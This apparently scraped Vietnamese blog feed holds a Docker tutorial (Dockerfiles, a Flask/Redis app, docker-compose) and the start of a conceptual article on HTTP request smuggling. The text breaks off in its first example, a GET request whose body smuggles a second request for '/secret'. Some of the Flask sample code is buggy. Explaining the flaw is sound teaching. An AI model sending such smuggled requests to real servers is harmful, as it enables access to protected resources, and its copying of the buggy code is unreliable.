dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Đặt tên file là Dockerfile nhé.</span></span><br><span class="line"><span class="comment"># Lưu ý phiên bản ubuntu tạo phải được hỗ trợ, nếu không khi chạy lệnh update nó sẽ báo lỗi. Mình chưa biết fix nên không nói rõ nhé :).</span></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y git</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y vim</span></span><br></pre></td></tr></table></figure>Bây giờ truy cập vào folder chứa Dockerfile rồi gõ lệnh <code>docker build -t ubuntu:own .</code></li></ul><p>Viết gọn các câu lệnh trên:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y \</span></span><br><span class="line"><span class="language-bash">git \</span></span><br><span class="line"><span class="language-bash">vim</span></span><br></pre></td></tr></table></figure><h4 id="Cau-lenh-CMD"><a href="#Cau-lenh-CMD" class="headerlink" title="Câu lệnh CMD:"></a>Câu lệnh CMD:</h4><p>Khác với RUN, câu lệnh CMD sẽ không thực thi trong quá trình build image, nó chỉ thực thi khi khởi chạy container của image đó. Cái này nhìn ví dụ là dễ hiểu nhất:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y git</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y vim</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;/&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>Chạy <code>docker build -t test .</code> để build image. Bây giờ chạy <code>docker run test</code> nó sẽ thực thi lệnh bên trong container này. Nó tương ứng với lúc chúng ta chạy lệnh <code>docker run test ls /</code>.<br>Nếu chúng ta chạy lệnh trực tiếp trên command line như <code>docker run test echo &quot;hello world&quot;</code> thì nó chỉ thực thi lệnh này và bỏ qua lệnh được viết ở trong Dockerfile.</p><h4 id="Docker-cache"><a href="#Docker-cache" class="headerlink" title="Docker cache:"></a>Docker cache:</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y git</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y vim</span></span><br></pre></td></tr></table></figure><p>Nếu chúng ta build Dockerfile trên từ lần thứ 2 trở đi nó sẽ build nhanh hơn lần đầu tiên, bởi vì nó sử dụng lại layer đã build. Cái này liên quan đến docker cache. Mỗi layer riêng lẻ build ở trong mỗi lần build image, nó đều được ghi lại ở docker cache để sử dụng lại (riêng lẻ luôn chứ không phải sử dụng theo từng image).</p><p>Ví dụ:<br>Build image 1:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span>          <span class="comment"># --&gt; cache</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y update      <span class="comment"># --&gt; cache</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y git <span class="comment"># --&gt; cache</span></span></span><br></pre></td></tr></table></figure><p>Build image 2:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span>          <span class="comment"># --&gt; reuse</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y update      <span class="comment"># --&gt; reuse</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y vim <span class="comment"># --&gt; Câu lệnh này khác và layer tương ứng với câu lệnh này chưa được tạo nên sẽ thực hiện tạo layer mới và đương nhiên sẽ cache lại.</span></span></span><br></pre></td></tr></table></figure><p>Để không cache lại, chúng ta có thể sử dụng cờ <code>--no-cache=true</code>, mà cờ này hơi phế nhỉ, xài làm gì :).<br><code>docker build -t test . --no-cache=true</code></p><h4 id="Cau-lenh-COPY"><a href="#Cau-lenh-COPY" class="headerlink" title="Câu lệnh COPY:"></a>Câu lệnh COPY:</h4><p>Dùng để copy file hay thư mục từ build context (nơi chứa Dockerfile và những file cần thiết) vào file hệ thống của container. Ví dụ:<br>Nội dung Dockerfile:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y vim</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> abc.txt /src/abc.txt</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;/src/abc.txt&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>Cùng thư mục với Dockerfile, tạo một file abc.txt ghi nội dung gì đó để test~</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t addfile .</span><br><span class="line">&gt; docker run addfile</span><br><span class="line">abc.txt file ne</span><br></pre></td></tr></table></figure><p>File abc.txt đã được copy vào thư mục src của container.</p><h4 id="Cau-lenh-ADD"><a href="#Cau-lenh-ADD" class="headerlink" title="Câu lệnh ADD:"></a>Câu lệnh ADD:</h4><p>Câu lệnh này gần như tương tự với câu lệnh COPY, điểm khác ở đây là ADD không chỉ copy từ context mà còn có thể download từ internet và copy vào container.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADD https://example.com/big.tar.xz /usr/src/things/</span><br></pre></td></tr></table></figure><p>ADD cũng có thể tự động giải nén file được tại về với một vài định dạng được hỗ trợ.</p><h4 id="Cau-lenh-WORKDIR"><a href="#Cau-lenh-WORKDIR" class="headerlink" title="Câu lệnh WORKDIR:"></a>Câu lệnh WORKDIR:</h4><p>Câu lệnh này dùng để tạo folder chỉ định và truy cập đến folder đó. <code>WORKDIR /app</code></p><h4 id="Xay-dung-Flask-web-don-gian-qua-Dockerfile"><a href="#Xay-dung-Flask-web-don-gian-qua-Dockerfile" class="headerlink" title="Xây dựng Flask web đơn giản qua Dockerfile:"></a>Xây dựng Flask web đơn giản qua Dockerfile:</h4><p><code>Python image</code>: Python image là một image được xây dựng dựa trên base image là <code>Alpine Linux</code>. Trong <code>Alpine Linux</code> này người ta sẽ cài python compiler vào. Cái này là trả lời thắc mắc cho việc tại sao python là compile mà lại có workdir các kiểu ~</p><p>Đầu tiên tạo thư mục app. Trong thư mục này sẽ chứa Dockerfile và một thư mục khác chứa file app.py, đặt là app luôn cho dễ nhé.<br>File app.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello world!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ = <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        app.run(host = <span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>Nội dung Dockerfile:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FROM python:3.8-alpine</span><br><span class="line">RUN pip install Flask==2.0.2</span><br><span class="line">WORKDIR /app</span><br><span class="line">COPY app /app</span><br><span class="line">CMD [&quot;python&quot;, &quot;app.py&quot;]</span><br></pre></td></tr></table></figure><p>Build image: <code>docker build -t flaskweb .</code><br>Chạy web: <code>docker run -d -p 5000:5000 flaskweb</code><br>Bây giờ trên browser gõ <a href="http://localhost:5000/">http://localhost:5000</a> để truy cập web vừa chạy.</p><h4 id="Docker-Container-Links"><a href="#Docker-Container-Links" class="headerlink" title="Docker Container Links:"></a>Docker Container Links:</h4><p>Container links cho phép các container tìm ra nhau và trao đổi thông tin một cách bảo mật với nhau.<br>Khi set up một cái link, chúng ta tạo ra một ống dẫn giữa source container và recipient container. Recipient container có thể truy cập, lấy dữ liệu và thêm dữ liệu từ source container.<br>Links được thành lập bằng cách sử dụng container name. Lợi ích của việc này là chúng ta có thể thấy một cách rõ ràng hơn, không cần phải thông qua localhost.<br>Ví dụ xây dựng một web app từ flask và redis (api để lưu trữ dữ liệu):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cây thư mục như sau:</span><br><span class="line">Dockerfile      </span><br><span class="line">app       --------&gt;app.py</span><br><span class="line">               |</span><br><span class="line">               ---&gt;templates-----&gt;index.html </span><br></pre></td></tr></table></figure><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>simple service<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span> <span class="attr">value</span>=<span class="string">&#123;&#123;</span> <span class="attr">key</span> &#125;&#125;&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;cache_value&quot;</span> <span class="attr">value</span>=<span class="string">&#123;&#123;</span> <span class="attr">cahe_value</span> &#125;&#125;&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;load&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;save&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">default_key = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">cache = redis.StrictRedis(host=<span class="string">&#x27;redis&#x27;</span>, port=<span class="number">6379</span>, db=<span class="number">0</span>)</span><br><span class="line">cache.<span class="built_in">set</span>(default_key, <span class="string">&quot;one&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key = default_key</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> request.form:</span><br><span class="line">        key = request.form[<span class="string">&#x27;form&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> request.form[<span class="string">&#x27;submit&#x27;</span>] == <span class="string">&#x27;save&#x27;</span>:</span><br><span class="line">        cache.<span class="built_in">set</span>(key, request.form[<span class="string">&#x27;cache_value&#x27;</span>])</span><br><span class="line">    cache_value = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> cache.get(key):</span><br><span class="line">        cache_value=cache.get(<span class="string">&#x27;key&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, key=key, cache_value=cache_value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>Dockerfile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FROM python:3.8-alpine</span><br><span class="line">RUN pip install Flask==2.0.2 redis==2.10.5</span><br><span class="line">WORKDIR /app</span><br><span class="line">COPY app /app</span><br><span class="line">CMD [&quot;python&quot;, &quot;app.py&quot;]</span><br></pre></td></tr></table></figure><p>Pull và khởi chạy redis: <code>docker run -d --name redis redis:3.2.0</code><br>Build image: <code>docker build -t dockerapp:v0.1 .</code><br>Khởi chạy image và link với redis: <code>docker run -d -p 5000:5000 --link redis dockerapp:v0.1</code></p><h4 id="Docker-compose"><a href="#Docker-compose" class="headerlink" title="Docker compose"></a>Docker compose</h4><p>Các thuộc tín trong docker compose:</p><ul><li>version: chỉ ra phiên bản docker-compose đã sử dụng.</li><li>services: thiết lập các services(containers) muốn cài đặt và chạy.</li><li>image: chỉ ra image được sử dụng trong lúc tạo ra container.</li><li>build: dùng để tạo container.</li><li>ports: thiết lập ports chạy tại máy host và trong container.</li><li>restart: tự động khởi chạy khi container bị tắt.</li><li>environment: thiết lập biến môi trường ( thường sử dụng trong lúc config các thông số của db).</li><li>depends_on: chỉ ra sự phụ thuộc. Tức là services nào phải được cài đặt và chạy trước thì service được config tại đó mới được chạy.</li><li>volumes: dùng để mount hai thư mục trên host và container với nhau.</li></ul><p>Cũng như ví dụ ở trên, thay vì chúng ta pull, build image rồi khởi chạy rườm rà. Chúng ta có thể viết một <code>docker compose</code> rồi khởi chạy chỉ với một câu lệnh <code>docker-compose up</code>. Docker compose file cần tuân thủ nghiêm ngặt thụt lề, mỗi lần thụt là 2 khoảng trắng.<br>File name: docker-compose.yml, nó phải nằm chung thư mục với Dockerfile.</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">dockerapp:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;5000:5000&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:3.2.0</span></span><br></pre></td></tr></table></figure><p>Khởi chạy gõ <code>docker-compose up</code> hoặc thêm cờ -d <code>docker-compose up -d</code> để treo trong container.<br>Docker compose sẽ không build lại image nếu image đó đã tồn tại, vì vậy khi ta thay đổi một vài lệnh trong Dockerfile docker-compose vẫn lấy image cũ để thao tác. Để build lại một image mới, chúng ta cần sử dụng lệnh <code>docker-compose build</code>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Docker-Command-Line&quot;&gt;&lt;a href=&quot;#Docker-Command-Line&quot; class=&quot;headerlink&quot; title=&quot;Docker Command Line&quot;&gt;&lt;/a&gt;Docker Command Line&lt;/h1&gt;&lt;h2 i</summary>
      
    
    
    
    <category term="DevOps" scheme="https://rayinaw.github.io/categories/DevOps/"/>
    
    <category term="Docker" scheme="https://rayinaw.github.io/categories/DevOps/Docker/"/>
    
    
    <category term="Docker" scheme="https://rayinaw.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Khái niệm cơ bản về HTTP request smuggling với HTTP/1.1</title>
    <link href="https://rayinaw.github.io/2022/11/30/http-request-smuggling-HTTP-1.1/"/>
    <id>https://rayinaw.github.io/2022/11/30/http-request-smuggling-HTTP-1.1/</id>
    <published>2022-11-30T03:36:10.000Z</published>
    <updated>2022-12-02T18:34:47.547Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Loi-noi-dau"><a href="#Loi-noi-dau" class="headerlink" title="Lời nói đầu:"></a>Lời nói đầu:</h1><p>Bài viết này là về khái niệm và cách HRS xảy ra đối với HTTP&#x2F;1.1, với HTTP&#x2F;2.0 và thực hành các bạn có thể xem ở bài viết sau.</p><h1 id="Mot-vai-kien-thuc-can-nam"><a href="#Mot-vai-kien-thuc-can-nam" class="headerlink" title="Một vài kiến thức cần nắm:"></a>Một vài kiến thức cần nắm:</h1><h2 id="Keep-Alive-va-Pipelining"><a href="#Keep-Alive-va-Pipelining" class="headerlink" title="Keep-Alive và Pipelining:"></a>Keep-Alive và Pipelining:</h2><p>Keep-Alive và Pipelining được giới thiệu trong RFC-2616:<br><code>Keep-Alive</code> cho phép một kết nối TCP giữa Client và Server được tiếp tục gửi và nhận HTTP requests và responses thay vì mở lại kết nối sau mỗi lần Client yêu cầu. Theo như mình thấy thì một số server sẽ set out timeout cho một kết nối keep-alive, sau khi user 1 yêu cầu đến server và server gửi response về, kết nối vẫn được mở và user khác có thể sử dụng kết nối này. Để bật mode Keep-Alive chúng ta cần thêm trường <code>Connection: Keep-Alive</code> vào request.</p><p><code>Pipelining</code> cho phép client gửi nhiều yêu cầu HTTP một lúc mà không cần đợi phản hồi của server thông qua một kết nối TCP được mở, server sẽ phản hồi theo thứ tự mà request được gửi đi. Để bật mode Pipeline chúng ta cần thêm trường <code>Connection: Pipelining</code> vào request.</p><h2 id="Content-Length-va-Transfer-Encoding"><a href="#Content-Length-va-Transfer-Encoding" class="headerlink" title="Content-Length và Transfer-Encoding:"></a>Content-Length và Transfer-Encoding:</h2><h3 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length:"></a>Content-Length:</h3><p>Đối với một yêu cầu POST, bắt buộc phải có 1 hoặc hơn trong 3 phương thức <code>Content-Length</code>, <code>Transfer-Encoding</code>, <code>Content-Type</code> và đương nhiên nó phải đúng định dạng.</p><p><code>Content-Length</code> đề cập đến kích thước phần body của một yêu cầu HTTP tính bằng byte. Nếu một tệp văn bản được nén, thì Content-Length của nó sẽ là kích thước được nén. Tiêu đề <code>Content-Length</code> chỉ có ở POST request vì nó có trường nội dung còn GET request thì không.</p><h3 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding:"></a>Transfer-Encoding:</h3><p><code>Transfer-Encoding</code> chỉ ra kiểu truyền tải nào được sử dụng để truyền tải nội dung(phần body). Transfer-Encoding có nhiều kiểu truyền tải, nhưng với lỗi HRS chúng ta chỉ cần chú ý đến phương thức <code>Transfer-Encoding: chunked</code>.</p><p>Với <code>Transfer-Encoding: chunked</code> Dữ liệu body sẽ được truyền theo từng khối. Bắt đầu bởi một số hex biểu thị số byte của nội dung đầu tiên, tiếp theo sau là data. Tiếp đến là lần lượt những đoạn hex, data như vậy. Để kết thúc nội dung byte cuối cùng sẽ là 0 và theo sau là \r\n. Một \r\n được gọi là một CRLF, độ dài không bao gồm CRLF. Ví dụ:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Nguồn wiki.</span><br><span class="line"><span class="number">4</span>\r\<span class="title function_ invoke__">n</span>        (bytes to send)</span><br><span class="line">Wiki\r\<span class="title function_ invoke__">n</span>     (data)</span><br><span class="line"><span class="number">6</span>\r\<span class="title function_ invoke__">n</span>        (bytes to send)</span><br><span class="line">pedia \r\<span class="title function_ invoke__">n</span>   (data)</span><br><span class="line">E\r\<span class="title function_ invoke__">n</span>        (bytes to send)</span><br><span class="line">in \r\n</span><br><span class="line">\r\n</span><br><span class="line">chunks.\r\<span class="title function_ invoke__">n</span>  (data)</span><br><span class="line"><span class="number">0</span>\r\<span class="title function_ invoke__">n</span>        (<span class="keyword">final</span> byte - <span class="number">0</span>)</span><br><span class="line">\r\<span class="title function_ invoke__">n</span>         (end message)</span><br></pre></td></tr></table></figure><p>Ở phương thức Transfer-Encoding chúng ta cần nắm cách đếm byte:</p><ul><li>Nếu dữ liệu trên 1 dòng thì không cần đếm \r\n sau nó.</li><li>Nếu dữ liệu nhiều dòng như dòng <code>E\r\n (bytes to send)</code> ở trên thì chúng ta cần đếm hết kể cả \r \n (lưu ý \r hay \n chỉ tính là 1 byte), ở dòng cuối cùng của khối data này có \r\n chúng ta sẽ không đếm nó vào.</li><li>Sau đó chuyển độ dài thành số hex tương ứng.</li></ul><h2 id="Reverse-proxy"><a href="#Reverse-proxy" class="headerlink" title="Reverse proxy:"></a>Reverse proxy:</h2><p>Reverse Proxy là một loại proxy server, nó đóng vai trò như một server bình thường. Nó tiếp nhận yêu cầu từ user, rồi chuyển tiếp đến các máy chủ khác xử lý yêu cầu đó rồi trả về cho người dùng. Người dùng ở đây chỉ giao tiếp với reverse proxy server mà không biết về sự tồn tại của máy chủ khác.<br>Cấu trúc của một request từ user đến một máy chủ có tồn tại reverse proxy như sau:<br>user —request—&gt; reverse proxy —request—&gt; back-end server<br>user &lt;–response— reverse proxy &lt;–response— back-end server</p><h2 id="Khai-niem-web-cache"><a href="#Khai-niem-web-cache" class="headerlink" title="Khái niệm web cache:"></a>Khái niệm web cache:</h2><p>Web cache sinh ra để nâng cao trải nghiệm người dùng. Khi người dùng yêu cầu như những dữ liệu như HTML, CSS, Javascript, image,…, server có thể sẽ lưu vào web cache để không phải thực hiện lại những truy vấn để lấy những dữ liệu đó, giúp cho việc lấy dữ liệu nhanh hơn, đỡ tốn tài nguyên hơn cho người dùng.</p><h3 id="Co-mot-so-loai-web-cache-nhu-sau"><a href="#Co-mot-so-loai-web-cache-nhu-sau" class="headerlink" title="Có một số loại web cache như sau:"></a>Có một số loại web cache như sau:</h3><p>Web cache ở phía browser: Sau khi người dùng thực hiện request lần đầu tiên đến server, nếu server hỗ trợ cache ở browser người dùng, dữ liệu sẽ được lưu vào cache ở browser của người dùng (nên xóa lịch sử web hay có mục cache). Khi người dùng request những lần tiếp theo tương tự như yêu cầu đầu tiên, browser chỉ cần lấy từ cache của browser để render ra cho người dùng.<br>Web cache phía Proxy Server: Nó thường là CDN caching. Nó hoạt động tương tự như browser caching tuy nhiên nơi lưu trữ cache ở đây là CDN server trên toàn thế giới. Ở đây nhiều user có thể dùng chung cache từ server gửi đến máy chủ CDN. Cách hoạt động các bạn có thể tham khảo thêm ở <a href="https://viblo.asia/p/cdn-content-delivery-network-caching-Qpmle2O75rd">đây</a>.<br>Web cache phía Reverse Proxy server: Cũng hoạt động tương tự như hai kiểu trên, tuy nhiên cache được lưu trữ ở phía Reverse Proxy.<br>Video tham khảo thêm về web cache:</p><div class="video-container"><iframe src="https://www.youtube.com/embed/HiBDZgTNpXY" frameborder="0" loading="lazy" allowfullscreen></iframe></div> <h2 id="Yeu-cau-cua-loi-HRS"><a href="#Yeu-cau-cua-loi-HRS" class="headerlink" title="Yêu cầu của lỗi HRS:"></a>Yêu cầu của lỗi HRS:</h2><p>Để một lỗi HRS xảy ra, trang web cần đáp ứng những yêu cầu sau:</p><ul><li>Trang web bao gồm hai máy chủ front-end (reverse proxy) và máy chủ back-end.</li><li>Máy chủ phải hỗ trợ Keep-Alive hoặc Pipelining để yêu cầu có thể gắn với yêu cầu của nạn nhân (Nếu bạn không hiểu thì cứ bỏ qua, đọc phần sau sẽ hiểu)</li><li>Máy chủ front-end và back-end phân tích các trường <code>Transfer-Encoding</code>, <code>Content-Length</code> không nghiêm ngặt khiến cho quá trình phân tích mắc sai lầm phát sinh lỗi.</li></ul><h1 id="HTTP-request-smuggling-o-HTTP-x2F-1-1"><a href="#HTTP-request-smuggling-o-HTTP-x2F-1-1" class="headerlink" title="HTTP request smuggling ở HTTP&#x2F;1.1"></a>HTTP request smuggling ở HTTP&#x2F;1.1</h1><h2 id="CL-Content-Length-khong-bang-0"><a href="#CL-Content-Length-khong-bang-0" class="headerlink" title="CL(Content-Length) không bằng 0:"></a>CL(Content-Length) không bằng 0:</h2><p>GET mang nội dung thì khá lạ, nhưng mà này thực sự xảy ra. Khá khó hiểu với mình. Vấn đề:</p><ul><li>Máy chủ proxy cho phép yêu cầu GET mang nội dung, nhưng máy chủ phía sau không cho phép mang nội dung request, máy chủ phía sau sẽ trực tiếp bỏ trường Content-Length và không xử lý nó. Từ đây nó sẽ phát sinh ra lỗi HRS.<br>Ví dụ:<br>Một request như sau:<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: <span class="number">44</span>\r\n</span><br><span class="line"> </span><br><span class="line">GET /secret HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>Máy chủ Proxy nhận được yêu cầu, như mình đã nói, vì một lý do nào đó mà request này được chấp nhận ở máy chủ Proxy mình không biết :). Nó sẽ chuyển đến máy chủ phía sau, tại đây nó không chấp nhận trường Content-Length nên nó sẽ xem như là yêu cầu riêng biệt, và nếu máy chủ có sử dụng <code>pipelining</code>, nó sẽ xem như là hai yêu cầu riêng biệt.<br>Yêu cầu thứ nhất:<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: 